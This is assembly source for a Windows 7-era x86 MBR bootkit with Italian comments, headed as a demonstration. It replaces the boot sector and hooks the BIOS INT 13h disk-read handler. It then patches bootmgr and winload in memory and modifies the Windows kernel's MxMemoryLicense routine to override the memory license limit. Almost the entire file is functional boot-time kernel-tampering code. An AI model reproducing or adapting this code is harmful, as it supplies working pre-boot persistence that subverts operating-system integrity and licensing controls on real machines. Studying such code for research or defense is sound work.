;AaLl86 Windows Vista/Seven/Eight x86 Memory Bootkit
;Test Bootkit targeting Windows 7 - Standard Boot Sector
;For demonstration purposes, do not use
;Compile with FASM: https://flatassembler.net/
;Copyright© 2013 Andrea Allievi

;.MODEL tiny, stdcall               ; Prima direttiva .model poi direttiva .386 altrimenti
;.386                               ; codice pieno di 0x66h in giro per l'allinemaneto a 32 bit

INCLUDE 'Win7x86Bootkit.inc'

;.data

;.code
     ORG                0h         ; Il BIOS carica il bootloader in memoria alla posizione 0x7c00
main:
     jmp short start     ; Vai allo StartPoint del Boot
     nop

start:
    ; Qui parte l'intero bootloader caricato dal bios con l'INT 19
    ; Per prima cosa setto i segment register e li faccio puntare allo stesso segmento (0000)
    cli                                         ; Clear Interrupt
    xor bx, bx
    ; Ora imposta uno stack decente
    mov ss, bx                  ; Stack Segment
    mov [ss:7bfeh], sp          ; Salva il vecchio Stack Pointer in [7bfeh]... Il perchè? semplice: 7C00 - 7BFE = 2
    mov sp, 7bfeh               ; Alla fine del codice quando lo SP è a 0x7c00 posso fare un pop sp
    push ds
    pushad

 ;   cld                        ; Clear directional Flag (per le stringhe)
 ;   mov    ds, bx              ; DS = 0
 ;   mov    si, 413h            ; Che azz c'è nell'indirizzo 413h? La DumpMem ha restituito 7E 02
 ;   sub    word [si], 02h       ; word ptr [si] = 027E - 02 = 027C
 ;   lodsw                      ; Load word at address DS:SI into AX = 027C.
 ;   shl    ax, 06h             ; ax = 0x027ch << 6 = 0x9f00h

    ; In real-mode la IDT è mappata dall'indirizzo 0000:0000h fino all'indirizzo 0:03ffh (256 entry da 4 bytes)
    ; la GDT invece è mappata all'indirizzo 000F:371C  (o a meno così dice la SGDT)
    ; Primo tentativo: copio l'intero MBR in 0600:0000, FALLITO perchè l'MBR di Seven utilizza già quel selettore
    ; mov    ax, 600h             ; Perchè 600h, semplice perchè l'indirizzo 0x0600:0000 viene mappato in 0x00006000
                                  ; in Protected Mode e in 64 bit Long Mode.

    ; Secondo tentativo: copio l'intero MBR modificato in 0x9c00:0000
    mov    ax, CODEBASEIN1MB    ; 0x9c00:0000 viene mappato in 0x0009c000 in Protected Mode e in 64 bit Long Mode
    mov    ds, bx               ; ds = 0
    mov    es, ax               ; es = CODEBASIN1MB
    mov    si, LOADLOC          ; si = 0x7c00
    xor    di, di               ; di = 0
    mov    cx, 100h             ; MOVSW = move word from address DS:SI to ES:DI.
                                ; REP MOVSW = Move CX words from DS:[SI] to ES:[DI].
    rep movsw                   ; Copia 200 bytes del MBR infetto all'indirizzo: 0x9f00h:0

    ; Qui aggancia l'interrupt 13 per la scrittura su disco
    mov    eax, dword [bx+4Ch]                   ; Cosa conterrà mai 0x004ch? Semplice contiene l'interrupt 13h location
    ;mov   word ptr [bx+4ch], 6ah                ; 13h = 19 * 4 = 76d = 4ch.  6ah è un offset????
    mov    word [bx+4Ch], int_13h                ; Certo è l'offset dell'int_13h
    ;mov   es:word ptr[77h], eax                 ; Il 77h è un offset che punta all'istruzione far jmp 0000:0000
    mov    dword [es:original_int13], eax        ; Riempie l'indirizzo di ritorno del far jmp dell'int 13h modificato
    mov    word [bx+4Eh], es                     ; Ora piazza il selector modificato nella locazione della interrupt 13h
    push   es                                    ; Metto nello stack il selector 0x9c00
    ;push   51h                                  ; 51h non è altro che l'offset della label from_new_selector

    push  from_new_selector
    retf                                         ; retf = Ret Far

    ; Inizio codice che inizia dal selector '0x9f00
from_new_selector:
    sti                    ; Abilita gli interrupt
    xor    bx,bx           ; Setta a 0 Bx
    mov    es, bx          ; Imposta il selettore es a 0x0000
    mov    ax, 201h        ; AH = 02h -> Read Sectors From Drive, AL = 01h -> numero di settori da leggere
    mov    cx, ORIGINAL_MBR_SECTOR         ; Settore in cui c'è l'MBR originale
    mov    dx, 80h         ; Indica il primo hard disk disponibile
    mov    bh, 7ch         ; BX = 0x7c00, che strano eh???
    int    13h

    popad                  ; ripristino i vecchi registri
    pop    ds
    pop    sp

    ; E salto al boot sector originale: far jump ea00000000
    db 0eah                           ; jmp far 0000:7c00h
    db 00h, 7ch, 00h, 00h             ; Notazione little endian


int_13h:
    ; Questa è la ISR dell'int 13h modificata
    pushf
    cmp    ah, 42h                      ; Se AH = 42h: Extended Read Sectors From Drive
    jz short Int13_Read_Request
    cmp    ah, 02h                      ; Se AH = 02h: Read Sectors From Drive
    jz short Int13_Read_Request
    popf

    db  0eah         ; jmp far ...   jmp far 0000:0000h
    dd 0h           ; runtime filled, original int 13h
original_int13 = $-4

    ; Questa routine va in esecuzione se il BIOS richiede una lettura dal disco
    ; fisso con l'int 13 e funzione 02h o 42h
Int13_Read_Request:
    mov byte [cs:function_type], ah   ; Salva la funzione originale nel registro CH dopo

    ; Chiama il vero Int13 Handler per eseguire la richiesta di lettura vera
    ;call   cs:[77h]                      ; 77h è l'offset al salto all'int13h originale
    call dword [cs:original_int13]        ; Call far indirect
    jc Int13Hook_ret                      ; Se c'è un errore di lettura esci dalla procedura

    pushf
    push es

    ;
    ; Adjust registers to internally emulate an AH=02h read if AH=42h was used
    ;
    cld
    mov    ah, 00h                        ; AH sempre settato a 0

    mov    ch, 00h                        ; INT 13 - Posiziona la funzione giusta nel reg. CH
    function_type = $-1


    cmp    ch, 42h                        ; Guarda se la funzione che vado a richiamare è la
    jnz short Int13Hook_notExtRead        ; AH = 42h: Extended Read Sectors From Drive

    ; Codice seguente eseguito se la funzione è la AH = 42h: Extended Read Sectors From Drive
    ; In poche parole converte la Extended Read Sector in una Read Sector (AH = 02h)
;      Int 13h - Function Extended Read Sector (AH = 42)
;      Parameters:
;      AH       42h = function number for extended read
;      DL       drive index (e.g. 1st HDD = 80h)
;      DS:SI    segment:offset pointer to the DAP, see below

;      DAP : Disk Address Packet
;      offset     size          description
;      00h        1 byte        size of DAP = 16 = 10h
;      01h        1 byte        unused, should be zero
;      02h        1 byte        number of sectors to be read, 0..127 (= 7Fh)
;      03h        1 byte        unused, should be zero
;      04h..07h   4 bytes       segment:offset pointer to the memory buffer to which sectors will be transferred (note that x86 is little-endian: if declaring the segment and offset separately, the offset must be declared before the segment)
;      08h..0Fh   8 bytes       absolute number of the start of the sectors to be read (1st sector of drive has number 0)

;      Results:
;      CF       Set On Error, Clear If No Error
;      AH       Return Code
    lodsw                        ; Load word at address DS:SI into AX
    lodsw                        ; +02h  WORD    number of blocks to transfer
    les    bx, [si]              ; Load ES:BX with far pointer from memory +04h  DWORD   transfer buffer

Int13Hook_notExtRead:
    test   ax, ax                ; CODICE utile se il numero di settori da leggere è 0 (vedi sopra)
    jnz short fine_inutile       ; Se AX è 0 lo aumento di 1
    inc    ax
fine_inutile:
    xor    cx, cx
    mov    cl, al                ; AL = Numero di settori da leggere

    ; Codice filtro per evitare le enormi letture
    and cl, 1Fh
;   jbe short L1
;   mov cl, 20h

L1:
    shl cx, 9            ; (AL * 200h)
    xor ax, ax           ; Cerco il primo byte 00h
    mov ax, bootmgr_firstbyte
    mov di, bx           ; BX = DI = puntatore alla memoria in cui risiede il/i settore/i appena letto

; Loop alla ricerca della firma dell'bootmgr
Int13Hook_scan_loop:
    repne scasb
    jcxz Int13Hook_scan_done
    ; Devo cercare il pattern 7e 44 51 3b (signature del bootmgr)

    ;es:di punta un byte dopo lo 0
    cmp dword [ES:DI], bootmgr_signature
    jnz Int13Hook_scan_loop

signature_found:
    mov ax, 02000h
    mov es, ax

    mov ax, CODEBASEIN1MB
    mov ds, ax
    mov si, BOOTMGR_16_BIT_PATCH_STARTS
    mov di, BmMainOffset

    ; bootmgr!main + BmMainOffset (0x0a8c)
    ; 6652         push edx       <- Applica la patch qui
    ; 6655         push ebp
    ; 6633ed       xor ebp, ebp
    ; 666a20       push 20h
    ; 6653         push ebx       <- EBX xosa contiene? 0x40100, Entry point del OSLOADER.EXE.
    ; 66cb         retf

    mov cx, BOOTMGR_16_BIT_PATCH_ENDS - BOOTMGR_16_BIT_PATCH_STARTS
    rep movsb                ; Muove i dati da DS:SI (9c00:BOOTMGR_16_BIT_PATCH_STARTS) in ES:DI (0x2000:0x0a8c)

    ;Restore old INT13 routine
    push    ebx
    push    es
    xor     bx, bx
    mov     es, bx
    mov     ebx, dword [cs:original_int13]
    mov     dword [es:04ch], ebx
    pop     es
    pop ebx

Int13Hook_scan_done:
    ;popad
    pop    es
    popf

Int13Hook_ret:
    retf  02h


BOOTMGR_16_BIT_PATCH_STARTS:
        mov     ebx, CODEBASEIN1MBEXACT + BOOTMGR_PATCHER_START
        ; Si traduce in: 66 BB xx 09 c0 00
        nop
BOOTMGR_16_BIT_PATCH_ENDS:


; |---------------------------------------------------------------------------------------------------------------|
; |                                  INIZIO codice a 32 bit Protected Mode                                        |
; |---------------------------------------------------------------------------------------------------------------|
use32
BOOTMGR_PATCHER_START:
        push    edx
        push    ebp

  ; Bootmgr trasferisce il controllo al Winload in questa routine:
  ; bootmgr!Archx86TransferTo32BitApplicationAsm:
  ; 00450a10 55              push    ebp                <-- Applica qui la patch
  ; 00450a11 56              push    esi
  ; 00450a12 57              push    edi                <-- EDI = Winload base address
  ; 00450a13 53              push    ebx
  ; 00450a14 06              push    es
  ; 00450a15 1e              push    ds
  ; 00450a16 8bdc            mov     ebx,esp
  ; 00450a18 0f0105b81b4900  sgdt    fword ptr [bootmgr!GdtRegister (00491bb8)]
  ; 00450a1f 0f010dd81b4900  sidt    fword ptr [bootmgr!IdtRegister (00491bd8)]
  ; 00450a26 0f0115f01b4900  lgdt    fword ptr [bootmgr!BootAppGdtRegister (00491bf0)]
  ; 00450a2d 0f011dc01b4900  lidt    fword ptr [bootmgr!BootAppIdtRegister (00491bc0)]
  ; 00450a34 33ed            xor     ebp,ebp
BOOTMGR_PATCH_ADDR EQU 0x450A10  ; patch here...

   mov  byte [BOOTMGR_PATCH_ADDR], 0x68   ; PUSH imm32 opcode
   mov  dword [BOOTMGR_PATCH_ADDR + 1], CODEBASEIN1MBEXACT + BOOTMGR_PATCH_START
   mov  byte [BOOTMGR_PATCH_ADDR+5], 0xc3 ; RET opcode

   mov  ebx, 0x401000       ; 401000 è l'entry point dell'OSLOADER.exe
                            ; kd> ln 401000
   push  ebx                ; Exact matches: (00401000) bootmgr!BmMain = <no type information>
   ret                      ; Passa il controllo al bootmgr!BmMain

BOOTMGR_PATCHER_ENDS:


; |-------------------------------------------------------------------------------------------------------|
; |                                        BOOTMGR SECOND PATCH                                           |
; Codice che va in esecuzione nel momento prima in cui il controllo sta per essere trasferito al Winload
; (quindi ancora a 32 bit Protected Mode with Pagining). La funzione da cui va in esecuzione il
; codice seguente è questa (vedi sopra):
; bootmgr!Archx86TransferTo32BitApplicationAsm
;        Funzione da modificare:  winload!OslArchTransferToKernel
BOOTMGR_PATCH_START:
   mov  eax, cr0        ;Disable paging and write protection
   and  eax, 07fffffffh
   mov  cr0, eax

   ; Cutted instruction (6 bytes)
   push  ebp
   push  esi
   push  edi            ; <-- EDI = Winload base address
   push  ebx
   push  es
   push  ds

  ; winload!OslArchTransferToKernel:
  ; 0032a0c8 0f 01 15 68 cb 37 00  lgdt    fword ptr [winload!OslKernelGdt (0037cb68)] ds:0030:0037cb68=80b9900003ff
  ; 0032a0cf 0f 01 1d 60 cb 37 00  lidt    fword ptr [winload!OslKernelIdt (0037cb60)]
  ; 0032a0d6 66 b8 10 00       mov     ax,10h      <-- Apply patch here
  ; 0032a0da 66 8e d8          mov     ds,ax
  ; 0032a0dd 66 8e c0          mov     es,ax
  ; 0032a0e0 668ed0          mov     ss,ax
  ; 0032a0e3 668ee8          mov     gs,ax
  ; 0032a0e6 66b83000        mov     ax,30h
  ; 0032a0ea 668ee0          mov     fs,ax
  ; 0032a0ed 66b82800        mov     ax,28h
  ; 0032a0f1 0f00d8          ltr     ax
  ; 0032a0f4 8b4c2404        mov     ecx,dword ptr [esp+4]
  ; 0032a0f8 8b442408        mov     eax,dword ptr [esp+8]
  ; 0032a0fc 33d2            xor     edx,edx
  ; 0032a0fe 51              push    ecx
  ; 0032a0ff 52              push    edx
  ; 0032a100 6a08            push    8
  ; 0032a102 50              push    eax
  ; 0032a103 cb              retf
   mov esi, edi
   add esi, 0x480C8

   ; Qui verifica la firma della funzione OslArchTransferToKernel
   cmp  dword [esi], 0x6815010f         ; 0f 01 15 68 (lgdt fword ptr ... )
   je   short OslArchToKernelFound      ; Ma dato che NON so l'offset in cui viene mappato il winload.exe ...
   mov esi, 0x200000

Winload_search:
   cmp  dword [esi], 0x6815010f         ; 0f 01 15 68 (lgdt fword ptr ... )
   ; ... Se l'offset è cannato la cerca
   je OslArchToKernelFound

   inc  esi
   cmp  esi, 0x400000
   jb  short Winload_search
   jmp NotFound

OslArchToKernelFound:
    ; winload!OslArchTransferToKernel Modificato:
    ; B8 XX XX XX XX mov eax, addr_of_patchcode
    ; FF E0 jmp eax

    add esi, 0Eh
    mov byte [esi], 0xB8                                    ; MOV EAX, Opcode
    mov dword [esi+01], CODEBASEIN1MBEXACT + WINLOAD_PATCH  ; IMM32 Offset
    mov word [esi+05], 0xe0ff                               ; JMP EAX

    add esi, 07h           ;07 è la dimensione delle istruzioni scritte

    ; Stampa il return address nella routine modificata nel Winload
    mov dword [CODEBASEIN1MBEXACT + WINLOAD_RETURN_ADDRESS], esi

NotFound:
    push        (BOOTMGR_PATCH_ADDR + 6)   ; 6 = sizeof(CUTTED_INSTRUCTION)
    ret
BOOTMGR_PATCH_END:

; |-------------------------------------------------------------------------------------------------------|
; |                                        WINLOAD PATCH                                                  |
; Codice che va in esecuzione nel momento prima in cui il controllo sta per essere trasferito al NTOSKRNL.EXE
; (quindi a 32 bit Protected Mode with Pagining). La funzione da cui va in esecuzione il codice seguente è questa (vedi sopra):
; winload!OslArchTransferToKernel
;
; OslArchTransferToKernel quando va in esecuzione ha già mappato in memoria NTOSKRNL.EXE. Quindi
; non devo far altro che trovare l'indirizzo in cui è mappato NTOSKRNL. Lo posso fare perchè al momento
; di partire OslArchTransferToKernel ha nel registro RDX l'indirizzo della nt!KiSystemStartup 
; (funzione del NTOSKRNL). Quindi non devo far altro che cercare all'indietro la firma del PE
; di NTOSKRNL.EXE (MZ -> Mark Zibrowski)
; QUINDI Funzione context del codice seguente:  winload!OslArchTransferToKernel
;        Funzione da modificare:  Qualsiasi del NTOSKRNL.EXE
WINLOAD_PATCH:

    push  edi
    mov   edi, dword [esp+0Ch]       ; <-- EAX = KiSystemStartup Virtual Address
    ; Devo trovare in memoria l'indirizzo iniziale ntOsBase
    push  ecx                     ; quindi cerca in memoria

    ; Cerca in memoria la firma del PE
    mov eax, 00905A4Dh          ; MZ ...
    mov ecx, NTOSKRNL_SIZE              ; size

    std      ; Reimposta il Directional Flag per le ricerche sulla sequenza di bytes

Kernel_srch:
    ; Inizia la ricerca con il primo byte (4D -> 'M')
    repne scasb       ; Compara il byte presente in AL con il byte puntato da RDI
    jecxz short  _srch_fail

    ; Va avanti con la ricerca, compara tutto il registro EAX con la memoria puntata da EDI+1
    cmp  [edi+1], eax    ; In pratica verifica la firma dell'NTOSKRNL
    jne  short Kernel_srch

    ; EDI ora punta ad un byte prima del 4D 5A (MZ)
    cld       ; ... e siamo sicuri che la memoria è l'NTOSKRNL
    inc edi     ; EDI ora punta a ntOsBase

START_NT_MODIFICATIONS:
    ; QUI Esegue la modifica vera e propria al kernel di Windows
    ; NTSTATUS __stdcall MxMemoryLicense(arg0, arg1)
    ; Pattern to seacrh:
    ; 85 c0            test    eax,eax
    ; 74 0a            je      nt!MxMemoryLicense+0x68 (81ba64b4)
    ; c1 e0 08          shl     eax,8
    ; a3 xx xx xx xx  mov     dword ptr [nt!MiTotalPagesAllowed (8198962c)],eax
    ; eb0a            jmp     nt!MxMemoryLicense+0x72
    ; c7 05 xx xx xx xx 00000800  mov dword ptr [nt!MiTotalPagesAllowed (8198962c)],80000h
    add edi, MEMORY_LICENSE_START
    mov ecx, 0C0000h
    mov al, 085h

MemLicense_Search:
    repne scasb
    jecxz _srch_fail
    cmp dword[edi-1], 0a74c085h
    jne MemLicense_Search
    cmp dword[edi+3], 0a308e0c1h
    jne MemLicense_Search

    ; B8 00 00 A0 00  mov eax, 0x0a00000
    mov dword[edi+1], 0A00000B8h
    mov byte[edi+5], 00h

    ; Now search:
    ; 7c 10            jl      nt!MxMemoryLicense+0xa8 (81ba64f4)
    ; 8b 45 fc         mov     eax,dword ptr [ebp-4]          <- Apply patch here
    ; 85 c0            test    eax,eax
    ; 74 09            je      nt!MxMemoryLicense+0xa8 (81ba64f4)
    mov cx, 080h
    mov al, 07ch

MemLicense_Search2:
    repne scasb
    jecxz _srch_fail
    cmp word[edi+1], 0458bh
    jne MemLicense_Search
    mov byte [edi-1], 0ebh

_srch_fail:
    pop  ecx
    pop  edi
    mov ax, 10h
    mov ds, ax

    db  068h             ; PUSH imm32 OPCODE -> Push sign-extended imm32
WINLOAD_RETURN_ADDRESS: dd 0 ; filled at runtime...
    ret

ends:
times 510-($-main) db 0 ; 512 total bytes
signa   db 55h,0aah             ;signature